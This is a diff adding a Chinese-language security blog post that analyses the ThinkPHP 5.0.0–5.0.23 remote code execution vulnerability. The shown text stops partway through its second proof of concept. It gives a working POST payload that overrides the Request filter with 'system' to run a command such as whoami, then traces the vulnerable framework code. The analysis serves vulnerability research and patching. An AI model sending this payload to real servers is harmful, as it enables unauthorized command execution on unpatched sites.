@@ -1,0 +1,1224 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="cqIhQLk06F" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="php,代码审计,命令执行,thinkphp," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="2019年1月11日，ThinkPHP官方发布安全更新，修复了一个GETSHELL漏洞。现分析如下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析">
+<meta property="og:url" content="http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/index.html">
+<meta property="og:site_name" content="Chybeta">
+<meta property="og:description" content="2019年1月11日，ThinkPHP官方发布安全更新，修复了一个GETSHELL漏洞。现分析如下。">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/1.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/9.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/10.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/4.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/2.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/3.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/5.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/6.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/7.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/12.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/11.jpg?raw=true">
+<meta property="og:updated_time" content="2019-01-13T15:17:20.616Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析">
+<meta name="twitter:description" content="2019年1月11日，ThinkPHP官方发布安全更新，修复了一个GETSHELL漏洞。现分析如下。">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/1.jpg?raw=true">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/"/>
+
+
+
+
+
+  <title> ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析 | Chybeta </title>
+  <meta name="baidu_union_verify" content="4dcd229ee2a964611d56cf139346dc50"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121975637-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Chybeta</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="chybeta">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Chybeta">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-13T09:32:42+08:00">
+                2019-01-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Web Security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/" class="leancloud_visitors" data-flag-title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>2019年1月11日，ThinkPHP官方发布<a href="https://blog.thinkphp.cn/910675" target="_blank" rel="external">安全更新</a>，修复了一个GETSHELL漏洞。现分析如下。</p>
+<a id="more"></a>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>以 thinkphp 5.0.22 完整版为例，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="external">http://www.thinkphp.cn/down/1260.html</a></p>
+<p>未开启调试模式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</div><div class="line"></div><div class="line">POST:</div><div class="line"></div><div class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/1.jpg?raw=true" alt=""></p>
+<h1 id="漏洞分析之POC-1"><a href="#漏洞分析之POC-1" class="headerlink" title="漏洞分析之POC 1"></a>漏洞分析之POC 1</h1><p>先整体的看一下这个流程，tp程序从 <code>App.php</code>文件开始，其中截取部分如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* 执行应用程序</div><div class="line">* <span class="doctag">@access</span> public</div><div class="line">* <span class="doctag">@param</span>  Request $request 请求对象</div><div class="line">* <span class="doctag">@return</span> Response</div><div class="line">* <span class="doctag">@throws</span> Exception</div><div class="line">*/</div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(Request $request = null)</span></span></div><div class="line">&#123;</div><div class="line">    $request = is_null($request) ? Request::instance() : $request;</div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        ...</div><div class="line">        <span class="comment">// 获取应用调度信息</span></div><div class="line">        $dispatch = <span class="keyword">self</span>::$dispatch;</div><div class="line"></div><div class="line">        <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</div><div class="line">            $dispatch = <span class="keyword">self</span>::routeCheck($request, $config);</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line"></div><div class="line">        $data = <span class="keyword">self</span>::exec($dispatch, $config);</div><div class="line">    &#125; <span class="keyword">catch</span> (HttpResponseException $exception) &#123;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在<code>App.php</code>中，会根据请求的URL调用<code>routeCheck</code>进行调度解析获得到<code>$dispatch</code>，之后将进入<code>exec($dispatch, $config)</code>根据<code>$dispatch</code>类型的不同来进行处理。</p>
+<p>在payload中，访问的url为<code>index.php?s=captcha</code>。在<code>vendor/topthink/think-captcha/src/helper.php</code>中captcha注册了路由，</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/9.jpg?raw=true" alt=""></p>
+<p>因此其对应的<code>dispatch</code>为<code>method</code>：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/10.jpg?raw=true" alt=""></p>
+<p>一步步跟入，其调用栈如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/4.jpg?raw=true" alt=""></p>
+<p>通过调用<code>Request</code>类中的<code>method</code>方法来获取当前的http请求类型，这里顺便贴一下该方法被调用之处：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/2.jpg?raw=true" alt=""></p>
+<p>该函数的实现在 thinkphp/library/think/Request.php:512<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">    * 当前的请求类型</div><div class="line">    * <span class="doctag">@access</span> public</div><div class="line">    * <span class="doctag">@param</span> bool $method  true 获取原始请求类型</div><div class="line">    * <span class="doctag">@return</span> string</div><div class="line">    */</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</div><div class="line">        <span class="comment">// 获取原始请求类型</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server(<span class="string">'REQUEST_METHOD'</span>) ?: <span class="string">'GET'</span>;</div><div class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</div><div class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>])) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>]);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;server(<span class="string">'REQUEST_METHOD'</span>) ?: <span class="string">'GET'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在tp的默认中配置中设置了表单请求类型伪装变量如下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/3.jpg?raw=true" alt=""></p>
+<p>因此通过POST一个<code>_method</code>参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定<code>_method</code>即可完成对该类的任意方法的调用，其传入对应的参数即对应的<code>$_POST</code>数组</p>
+<p><code>Request</code>类的构造函数<code>__construct</code>代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</div><div class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;$name = $item;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 保存 php://input</span></div><div class="line">    <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">'php://input'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>利用foreach循环，和POST传入数组即可对<code>Request</code>对象的成员属性进行覆盖。其中<code>$this-&gt;filter</code>保存着全局过滤规则。经过覆盖，相关变量变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$this</div><div class="line">    method = &quot;get&quot;</div><div class="line">    get = &#123;array&#125; [0]</div><div class="line">        0 = dir</div><div class="line">    filter =  &#123;array&#125; [0]</div><div class="line">        0 = system</div></pre></td></tr></table></figure></p>
+<p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code>。在进行完路由检测后，执行<code>self::exec($dispatch, $config)</code>，在thinkphp/library/think/App.php:445，由于<code>$dispatch</code>值为<code>method</code>，将会进入如下分支:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($dispatch, $config)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">switch</span> ($dispatch[<span class="string">'type'</span>]) &#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">case</span> <span class="string">'method'</span>: <span class="comment">// 回调方法</span></div><div class="line">            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[<span class="string">'var'</span>]);</div><div class="line">            $data = <span class="keyword">self</span>::invokeMethod($dispatch[<span class="string">'method'</span>], $vars);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>跟入<code>Request::instance()-&gt;param()</code>，该方法用于处理请求中的各种参数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;mergeParam)) &#123;</div><div class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    <span class="comment">// 当前请求参数和URL地址中的参数合并</span></div><div class="line">    <span class="keyword">$this</span>-&gt;param      = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</div><div class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</div><div class="line">    ...</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>如上方法中<code>$this-&gt;param</code>通过<code>array_merge</code>将当前请求参数和URL地址中的参数合并。回忆一下前面已经通过<code>__construct</code>设置了<code>$this-&gt;get</code>为<code>dir</code>。此后<code>$this-&gt;param</code>其值被设置为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/5.jpg?raw=true" alt=""></p>
+<p>继续跟入<code>$this-&gt;input</code>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="comment">// 解析过滤器</span></div><div class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</div><div class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</div><div class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</div><div class="line">        reset($data);</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>该方法用于对请求中的数据即接收到的参数进行过滤，而过滤器通过<code>$this-&gt;getFilter</code>获得：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</div><div class="line">        $filter = [];</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</div><div class="line">        <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</div><div class="line">            $filter = explode(<span class="string">','</span>, $filter);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $filter = (<span class="keyword">array</span>) $filter;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $filter[] = $default;</div><div class="line">    <span class="keyword">return</span> $filter;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>前面<code>$this-&gt;filter</code>已经被设置为<code>system</code>，所以<code>getFilter</code>返回后<code>$filter</code>值为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/6.jpg?raw=true" alt=""></p>
+<p>回到<code>input</code>函数，由于<code>$data</code>是前面传入的<code>$this-&gt;param</code>即数组，所以接着会调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter)</code>，对<code>$data</code>中的每一个值调用<code>filterValue</code>函数，最终调用了<code>call_user_func</code>执行代码:</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/7.jpg?raw=true" alt=""></p>
+<h1 id="扩展之POC-2"><a href="#扩展之POC-2" class="headerlink" title="扩展之POC 2"></a>扩展之POC 2</h1><p>回想前面的调用链，param -&gt; method -&gt; input -&gt; getFilter -&gt; rce。因为<code>filter</code>可控，而tp的逻辑会对输入即input进行<code>filter</code>过滤，所以重点是找到一个合理的<code>input</code>入口。</p>
+<p>回到<code>param</code>方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;mergeParam)) &#123;</div><div class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>跟入<code>$this-&gt;method(true)</code>注意此时的参数为<code>true</code>，所以此处会进入第一个分支:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</div><div class="line">        <span class="comment">// 获取原始请求类型</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server(<span class="string">'REQUEST_METHOD'</span>) ?: <span class="string">'GET'</span>;</div><div class="line">    &#125;</div><div class="line">    ... </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>继续跟入<code>$this-&gt;server</code>，可以发现这里也有一个<code>input</code>!<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;server)) &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;server = $_SERVER;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server = array_merge(<span class="keyword">$this</span>-&gt;server, $name);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;server, <span class="keyword">false</span> === $name ? <span class="keyword">false</span> : strtoupper($name), $default, $filter);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
